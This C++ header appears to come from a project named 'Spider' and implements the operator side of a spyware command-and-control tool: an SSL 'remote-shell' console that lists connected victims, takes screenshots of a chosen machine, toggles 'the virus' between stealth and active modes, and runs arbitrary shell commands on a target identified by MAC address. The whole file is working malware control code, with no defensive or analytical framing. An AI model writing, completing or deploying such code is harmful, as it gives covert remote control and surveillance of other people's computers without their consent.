//
// Created by roman sztergbaum on 05/10/2017.
//

#ifndef SPIDER_SERVER_CLIENTSESSION_HPP
#define SPIDER_SERVER_CLIENTSESSION_HPP

#include <log/Logger.hpp>
#include <Network/SSLContext.hpp>
#include <Network/SSLConnection.hpp>
#include <utils/CLI.hpp>
#include <Protocol/Messages.hpp>
#include <Protocol/CommandHandler.hpp>
#include <Network/BufferView.hpp>
#include "PosixStream.hpp"
#include "SyncCommandableSession.hpp"
#include "Client.hpp"

namespace sh
{
    struct Config
    {
        std::string address;
        unsigned short port;
    };
}

namespace sh
{
    class ClientSession : public spi::SyncCommandableSession
    {
    public:
        ClientSession(spi::net::SSLContext &ctx, spi::net::IOManager &mgr) :
            spi::SyncCommandableSession(mgr, ctx, "remote-shell"), _ctx(ctx), _mgr(mgr)
        {
            if (!_ctx.usePrivateKeyFile("key.pem") || !_ctx.useCertificateFile("cert.pem")) {
                _log(logging::Error) << "SSL Context loading error" << std::endl;
                this->__close();
            }
            _cmdHandler.onMessages(boost::bind(&ClientSession::__listReply, this, _1),
                                   spi::proto::MessageType::RListReply);
            _cmdHandler.onMessages(boost::bind(&ClientSession::__reply, this, _1),
                                   spi::proto::MessageType::ReplyCode);
            _cmdHandler.onMessages(boost::bind(&ClientSession::__handleRawData, this, _1),
                                   spi::proto::MessageType::RawData);
        }

        void setup(const sh::Config &cfg)
        {
            _address = cfg.address;
            _port = cfg.port;
            __setupCallbacks();
        }

        void run()
        {
            _running = true;
            __run();
        }

    private:
        void __checkErrorCode(spi::ErrorCode &ec, std::string_view onSuccess = "", bool close = true)
        {
            if (ec) {
                _log(logging::Error) << ec.message() << std::endl;
                if (close)
                    __close();
                else
                    _running = false;
            } else {
                if (onSuccess != "")
                    _log(logging::Info) << onSuccess << std::endl;
            }
        }

        void __connect() noexcept
        {
            auto ec = _conn.connect(_address, _port);
            __checkErrorCode(ec, "Connected");
        }

        void __handshake() noexcept
        {
            if (_running) {
                auto ec = handshake(spi::net::SSLConnection::HandshakeType::Client);
                __checkErrorCode(ec, "Handshake Success");
            }
        }

        void __processInput() noexcept
        {
            std::cout << _cli.runCommand("helpfull") << std::flush;
            std::cout << _cli.prompt() << std::flush;
            while (_running) {
                std::string line;
                auto ec = _interractive.readLine(line);
                if (ec) {
                    _log(logging::Error) << ec.message() << std::endl;
                    _running = false;
                } else {
                    if (!line.empty())
                        line.pop_back();
                    std::cout << _cli.runCommand(line) << std::endl;
                }
                if (_running)
                    std::cout << _cli.prompt() << std::flush;
            }
            __close();
        }

        void __run()
        {
            __connect();
            __handshake();
            if (_running) {
                __processInput();
            }
        }

        void __close() noexcept
        {
            _running = false;
            _conn.rawSocket().close();
            _log(logging::Info) << "Closing socket ..." << std::endl;
            _interractive.close();
            _log(logging::Info) << "Closing input filedescriptor ..." << std::endl;
            _mgr.stop();
            _log(logging::Info) << "Stopping IOService ..." << std::endl;
        }

        void __write(spi::ILoggable &loggable, spi::ErrorCode &ec) noexcept
        {
            spi::Buffer buffer;

            loggable.serialize(buffer);
            _conn.writeSome(buffer, ec);
            __checkErrorCode(ec, "", false);
        }

    private:
        //! Callback for the Command Line Interfaces.
        //! Using of StringStream for Graphical Compatibility.
        std::string __list([[maybe_unused]] utils::CLI::commandArg &&arg)
        {
            std::stringstream ss;
            try {
                spi::proto::RList list;
                spi::ErrorCode ec;
                __write(list, ec);
                if (!ec) {
                    spi::ErrorCode ecAnswer;
                    getResult(ecAnswer);
                    __checkErrorCode(ecAnswer, "", false);
                }
            } catch (const std::exception &error) {
                _log(logging::Error) << error.what() << std::endl;
            }
            return ss.str();
        }

        void __listReply(const spi::ILoggable &l)
        {
            std::cout << l.JSONify() << std::endl;
        }

        void __reply(const spi::ILoggable &l)
        {
            std::cout << l.stringify() << std::endl;
        }

        void __handleRawData(const spi::ILoggable &l)
        {
            using namespace spi;

            const proto::RawData &rd = static_cast<const proto::RawData &>(l);

            std::string output(rd.bytes.begin(), rd.bytes.end());
            std::cout << "Size: " << rd.bytes.size() << std::endl;
            std::cout << "Data: " << std::endl << output << std::endl;
        }

        std::string __screenshot(utils::CLI::commandArg &&arg)
        {
            std::stringstream ss;
            try {
                net::MACAddress addr{};
                addr.fromString(arg[0]);
                spi::ErrorCode ec;
                spi::proto::RScreenshot screen{};
                screen.addr = addr;
                __write(screen, ec);
                if (!ec)
                    getResult(ec);
            }
            catch (const std::invalid_argument &error) {
                _log(logging::Error) << error.what() << std::endl;
            }
            return ss.str();
        }

        std::string __stealth(utils::CLI::commandArg &&arg)
        {
            std::stringstream ss;
            try {
                net::MACAddress addr{};
                addr.fromString(arg[0]);
                spi::proto::RStealthMode stealthMode{};
                stealthMode.addr = addr;
                spi::ErrorCode ec;
                __write(stealthMode, ec);
                if (!ec) {
                    getResult(ec);
                }
            }
            catch (const std::invalid_argument &error) {
                _log(logging::Error) << error.what() << std::endl;
            }
            return ss.str();
        }

        std::string __active([[maybe_unused]] utils::CLI::commandArg &&arg)
        {
            std::stringstream ss;
            try {
                net::MACAddress addr{};
                addr.fromString(arg[0]);
                spi::proto::RActiveMode activeMode{};
                activeMode.addr = addr;
                spi::ErrorCode ec;
                __write(activeMode, ec);
                if (!ec)
                    getResult(ec);
            }
            catch (const std::invalid_argument &error) {
                _log(logging::Error) << error.what() << std::endl;
            }
            return ss.str();
        }

        std::string __runShell(utils::CLI::commandArg &&arg)
        {
            try {
                net::MACAddress addr{};
                addr.fromString(arg[0]);
                spi::proto::RRunShell rrsh;
                rrsh.target = addr;
                rrsh.cmd = arg[1];
                spi::ErrorCode ec;
                __write(rrsh, ec);
                if (!ec)
                    getResult(ec);
            } catch (const std::invalid_argument &e) {
                _log(logging::Error) << e.what() << std::endl;
            }
            return "";
        }

        std::string __exit([[maybe_unused]] utils::CLI::commandArg &&arg)
        {
            this->_running = false;
            return "\n";
        }

    private:
        void __setupCallbacks() noexcept
        {
            auto &&bind = [this](auto &&arg) {
                return std::bind(arg, this, ph::_1);
            };
            _cli.addCommand
                ("list", bind(&ClientSession::__list), 0, __usage("get the list of the connected clients", "list"))
                ("screenshot", bind(&ClientSession::__screenshot), 1, __usage("take a screenshot", "screenshot", "ID"))
                ("stealth", bind(&ClientSession::__stealth), 1, __usage("stealth the virus", "stealth", "ID"))
                ("active", bind(&ClientSession::__active), 1, __usage("active the virus", "active", "ID"))
                ("shell", bind(&ClientSession::__runShell), 2, __usage("", "", ""))
                ("exit", bind(&ClientSession::__exit), 0, __usage("quit the remoteShell", "exit"));
        }

    private:
        std::string __usage(std::string_view usage, std::string_view command) const noexcept
        {
            return utils::unpackToString("Use this command to ", usage, " -> ", utils::Yellow, command, utils::Reset);
        }

        std::string __usage(std::string_view usage, std::string_view command, std::string_view arg) const noexcept
        {
            return utils::unpackToString("Use this command to ", usage, " of the given ClientSession id ",
                                         utils::Yellow, command, utils::Reset, " [",
                                         utils::LightMagenta, arg, utils::Reset, "].");
        }

    private:
        bool _running{false};
        logging::Logger _log{"remote-shell", logging::Level::Info};
        spi::net::SSLContext &_ctx;
        spi::net::IOManager &_mgr;
        spi::net::PosixStream _interractive{_mgr, ::dup(STDIN_FILENO)};
        utils::CLI _cli;
        unsigned short _port;
        std::string _address;
    };
}

#endif //SPIDER_SERVER_CLIENTSESSION_HPP
